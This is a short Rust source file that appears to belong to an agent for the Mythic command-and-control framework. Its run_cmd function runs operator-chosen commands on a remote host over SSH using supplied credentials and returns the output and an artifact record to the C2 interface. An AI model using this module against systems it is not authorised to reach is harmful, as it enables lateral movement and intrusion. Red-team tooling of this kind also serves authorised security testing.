use crate::agent::AgentTask;
use crate::mythic_success;
use ssh2::Session;
use std::error::Error;
use std::io::Read;
use std::result::Result;

/// Execute a shell command on a system using SSH
/// * `sess` - Connects SSH session
/// * `task` - Mythic task
/// * `args` - Task arguments
pub fn run_cmd(
    sess: Session,
    task: &AgentTask,
    args: &super::SshArgs,
) -> Result<serde_json::Value, Box<dyn Error>> {
    // Open up a channel for executing shell commands and reading the result
    let mut channel = sess.channel_session()?;

    // Get the command to run from the arguments and run it
    let cmd = args.exec.as_ref().unwrap();
    channel.exec(cmd)?;

    // Read stdout of the command
    let mut stdout = String::new();
    channel.read_to_string(&mut stdout)?;

    // Read stderr of the command
    let mut stderr = String::new();
    channel.stderr().read_to_string(&mut stderr)?;

    // Close the command channel
    channel.wait_close()?;

    // Formulate the output for sending to the Mythic UI
    let mut output = mythic_success!(
        task.id,
        format!(
            "Connection: {}@{}\nCommand status: {}\n\nStdout:\n{}\nStderr:\n{}",
            args.credentials.account,
            args.host,
            channel.exit_status()?,
            stdout,
            stderr,
        )
    );

    let output = output.as_object_mut().unwrap();
    output.insert(
        "artifacts".to_string(),
        serde_json::json!(
            [
                {
                    "base_artifact": "Remote Proccess Create",
                    "artifact": format!("ssh {}@{} -exec {}", args.credentials.account, args.host, cmd)
                }
            ]
        )
    );

    Ok(serde_json::to_value(output)?)
}
